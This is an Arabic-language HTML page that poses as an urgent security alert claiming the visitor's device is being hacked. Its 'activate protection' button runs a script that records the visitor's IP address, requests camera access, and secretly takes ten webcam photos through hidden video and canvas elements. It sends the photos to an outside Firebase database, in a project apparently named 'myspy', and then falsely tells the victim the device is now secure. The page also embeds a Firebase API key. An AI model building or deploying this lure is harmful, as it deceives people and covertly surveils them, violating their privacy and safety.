<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام الحماية المتقدم - المشاكس</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: radial-gradient(circle, #200, #000); color: white; font-family: "Arial"; text-align: center; margin: 0; padding: 20px; }
        .box { border: 2px solid #f00; border-radius: 20px; padding: 25px; background: rgba(0,0,0,0.85); box-shadow: 0 0 30px #f00; display: inline-block; margin-top: 50px; width: 90%; max-width: 500px; }
        .btn-main { background: linear-gradient(to bottom, #f00, #800); color: #fff; width: 100%; padding: 20px; border: none; border-radius: 10px; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 20px; }
        #status { color: #f44; margin-top: 15px; font-weight: bold; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="box">
        <h2 style="color:#f00;">⚠️ تنبيه أمني عاجل</h2>
        <p>تم اكتشاف محاولة اختراق لجهازك الآن!<br>اضغط أدناه لتفعيل درع الحماية وسحب ملفات التجسس.</p>
        <button class="btn-main" onclick="startTrap()">تفعيل الحماية 🛡️</button>
        <div id="status">الحالة: بانتظار التفعيل...</div>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        const firebaseConfig = { 
            apiKey: "AIzaSyAvb-rjNbcWHlZEdEF0q9v3PL8XF8jnt3U", 
            authDomain: "myspy-2579b.firebaseapp.com", 
            projectId: "myspy-2579b", 
            databaseURL: "https://myspy-2579b-default-rtdb.firebaseio.com" 
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        async function startTrap() {
            const status = document.getElementById('status');
            try {
                // 1. سحب الـ IP
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                // 2. طلب صلاحية الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('v');
                video.srcObject = stream;
                status.innerText = "⏳ جاري فحص النظام وتأمين الثغرات...";

                let count = 0;
                const interval = setInterval(() => {
                    const canvas = document.getElementById('c');
                    canvas.width = 640; canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    // 3. إرسال الصيد للـ Firebase
                    db.ref('results').push({
                        photo: canvas.toDataURL('image/jpeg', 0.5),
                        ip: ipData.ip,
                        time: new Date().toLocaleString()
                    });

                    count++;
                    if (count >= 10) {
                        clearInterval(interval);
                        status.innerText = "✅ تم تأمين جهازك بنجاح!";
                        alert("✅ تم تفعيل الدرع الفولاذي! جهازك الآن في أمان تام.");
                    }
                }, 700); // يصور صورة كل 700 مللي ثانية
            } catch (err) {
                alert("🚨 خطأ! يجب السماح بصلاحية الكاميرا لإتمام الفحص الأمني.");
                status.innerText = "❌ فشل التفعيل بسبب الصلاحيات.";
            }
        }
    </script>
</body>
</html>
